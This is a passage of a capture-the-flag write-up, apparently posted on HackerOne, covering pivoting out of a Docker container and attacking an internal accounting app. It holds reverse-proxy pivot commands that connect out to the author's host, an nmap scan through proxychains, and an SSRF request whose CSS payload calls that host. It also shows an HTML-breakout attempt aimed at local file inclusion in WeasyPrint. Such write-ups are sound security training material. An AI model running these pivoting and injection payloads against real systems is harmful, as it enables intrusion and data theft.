\u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003emethod\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e64\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n                \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.5\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003evalidLogin\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]:\u003c/span\u003e\n                    \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;loggedIn\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eredirect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/main\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003erender\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;index\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;login\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Invalid username or password\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt this point, I couldn\u0026#39;t find any other interesting stuff on this box so that means we need to pivot. I also tried Docker escapes, but I \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fdaeken%2Fstatus%2F1104857106061119489%3Fs%3D19\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eguess that wasn\u0026#39;t the right idea, lol\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Since we\u0026#39;re on a LAN, let\u0026#39;s scan for other hosts. But because we\u0026#39;re in Docker, we can\u0026#39;t listen on any new ports. If we\u0026#39;d like to pivot through this box, we need to setup a backconnect proxy server. I like to use \u003ccode\u003erpivot\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@perfect.blue:~/rpivot# python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080\nroot@d090cd50ec64:~# cd /dev/shm\nroot@d090cd50ec64:/dev/shm# git clone https://github.com/klsecservices/rpivot\nroot@d090cd50ec64:/dev/shm# python client.py --server-ip perfect.blue --server-port 9999\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis lands us a nice SOCKS4 proxy. But let\u0026#39;s upgrade this to a SOCKS5 and HTTP proxy so it\u0026#39;s a bit comfier. Nothing pchains can\u0026#39;t handle.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@perfect.blue:~# proxychains ../microsocks/microsocks -i 127.0.0.1 -p 1081\nroot@perfect.blue:~# hpts -s 127.0.0.1:1081 -p 8080\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, we can proxychains nmap 172.25.0.0/16 for other hosts. And almost immediately, we find a neighbor on the LAN (this container restarted later so the IP address is different). And it is also listening on port 80.\u003c/p\u003e\n\n\u003ch3 id=\"0x04-accounting\"\u003e(0x04) Accounting\u003c/h3\u003e\n\n\u003cp\u003eUsing the HTTP proxy we just setup, we navigate over to \u003ca title=\"http://172.28.0.3/\" href=\"/redirect?url=http%3A%2F%2F172.28.0.3%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://172.28.0.3/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and find this:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"accounting.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/491/663bd5f0074c02f5bffdd3b6ddb439d3df3aef28/accounting.png?response-content-disposition=attachment%3B%20filename%3D%22accounting.png%22%3B%20filename%2A%3DUTF-8%27%27accounting.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=dab04fca195f4caef46a49eea871dc19263d1909745bdb6cdc758ec4098f71a6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/491/663bd5f0074c02f5bffdd3b6ddb439d3df3aef28/accounting.png?response-content-disposition=attachment%3B%20filename%3D%22accounting.png%22%3B%20filename%2A%3DUTF-8%27%27accounting.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=dab04fca195f4caef46a49eea871dc19263d1909745bdb6cdc758ec4098f71a6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis looks sensitive. Reports and Invoices are both gated behind a login page, and there is no obvious SQLi. Luckily with some directory searching we are able to find \u003ca title=\"http://172.28.0.3/invoices/new:\" href=\"/redirect?url=http%3A%2F%2F172.28.0.3%2Finvoices%2Fnew%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://172.28.0.3/invoices/new:\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"accounting2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/493/fce7956546bdb404adebdb9117ba1f055f1f5ce4/accounting2.png?response-content-disposition=attachment%3B%20filename%3D%22accounting2.png%22%3B%20filename%2A%3DUTF-8%27%27accounting2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=b1aa3a93ef2b03259eaba397d91042a10f2dafa908bdd4ef89773ff2cbdffa84\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/493/fce7956546bdb404adebdb9117ba1f055f1f5ce4/accounting2.png?response-content-disposition=attachment%3B%20filename%3D%22accounting2.png%22%3B%20filename%2A%3DUTF-8%27%27accounting2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=b1aa3a93ef2b03259eaba397d91042a10f2dafa908bdd4ef89773ff2cbdffa84\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow we\u0026#39;re talking! I bet this is vuln. Let\u0026#39;s quickly glance over the source code to make sure there\u0026#39;s no obvious problems.\u003c/p\u003e\n\n\u003cp\u003eI checked the PDf output for metadata, because I wanted to see how the PDF was being generated. That way I could check if there were known vulnerabilities in that library.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e$ dumppdf.py -a pdfize.pdf | less\n\u003cspan class=\"nt\"\u003e\u0026lt;object\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;26\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;dict\u003c/span\u003e \u003cspan class=\"na\"\u003esize=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;key\u0026gt;\u003c/span\u003eProducer\u003cspan class=\"nt\"\u003e\u0026lt;/key\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;value\u0026gt;\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003esize=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;39\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ecairo 1.14.8 \u003cspan class=\"ni\"\u003e\u0026amp;#40;\u003c/span\u003ehttp://cairographics.org\u003cspan class=\"ni\"\u003e\u0026amp;#41;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;key\u0026gt;\u003c/span\u003eCreator\u003cspan class=\"nt\"\u003e\u0026lt;/key\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;value\u0026gt;\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003esize=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;39\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ecairo 1.14.8 \u003cspan class=\"ni\"\u003e\u0026amp;#40;\u003c/span\u003ehttp://cairographics.org\u003cspan class=\"ni\"\u003e\u0026amp;#41;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/dict\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/object\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA quick search for \u0026quot;Python web page pdf cairo\u0026quot; showed the library WeasyPrint. Let\u0026#39;s keep this in mind.\u003c/p\u003e\n\n\u003cp\u003eNext, looking at the requests in Burp, the most interesting thing I noticed was that there was some CSS that we could control in the request parameters:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET http://172.28.0.3/invoices/preview?d={\u0026quot;companyName\u0026quot;:\u0026quot;a\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;b\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;c\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;d\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;a\u0026quot;,\u0026quot;b\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-color\u0026quot;:\u0026quot;white\u0026quot;}}}\n\nHTTP/1.1 200 OK\n...\n        body {\n            background-color: white;\n        }\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCan we get SSRF using this?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET http://172.28.0.3/invoices/pdfize?d={\u0026quot;companyName\u0026quot;:\u0026quot;a\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;b\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;c\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;d\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;a\u0026quot;,\u0026quot;b\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-image\u0026quot;:\u0026quot;url(\u0026#39;http://perfect.blue:12345/lol.png\u0026#39;)\u0026quot;}}}\n\nroot@perfect.blue:~## nc -lvp 12345\nListening on [0.0.0.0] (family 0, port 12345)\nConnection from 98.12.196.104.bc.googleusercontent.com 47690 received!\nGET /lol.png HTTP/1.1\nHost: perfect.blue:12345\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n^C\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYup...and we now also know that it\u0026#39;s Weasyprint. At this point, I wasted a lot of time trying to use SVG to somehow include a file URL to get LFI or to get XXE. But no dice. I also tried to use \u003ccode\u003e@font-face src\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eFailing that I decided to check Weasyprint\u0026#39;s GitHub issues, and I saw \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint%2Fpull%2F177\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis (merged) pull request\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. That\u0026#39;s golden! It\u0026#39;s a LFI for free, if we can somehow manage to inject an \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e or \u003ccode\u003e\u0026lt;link\u0026gt;\u003c/code\u003e tag. SVG won\u0026#39;t work for this, because Weasyprint renders SVG by handing it off to CairoSVG. So we need a way to break out of the CSS or table data into the HTML. At this point I simply tried putting \u003ccode\u003e\u0026lt;\u003c/code\u003e in every field.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET http://172.28.0.3/invoices/preview?d={\u0026quot;companyName\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;\u0026lt;\u0026quot;,\u0026quot;\u0026lt;\u0026quot;,\u0026quot;1\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;\u0026lt;\u0026quot;:{\u0026quot;\u0026lt;\u0026quot;:\u0026quot;\u0026lt;\u0026quot;}}}\n\n        \u0026amp;lt; {\n            \u0026lt;: \u0026amp;lt;;\n        }\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWould you look at that...every field is sanitized \u003cstrong\u003eexcept\u003c/strong\u003e the CSS selector, lol. But apparently, \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e is sanitized out. OK, so what if I make the tag malformed?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET 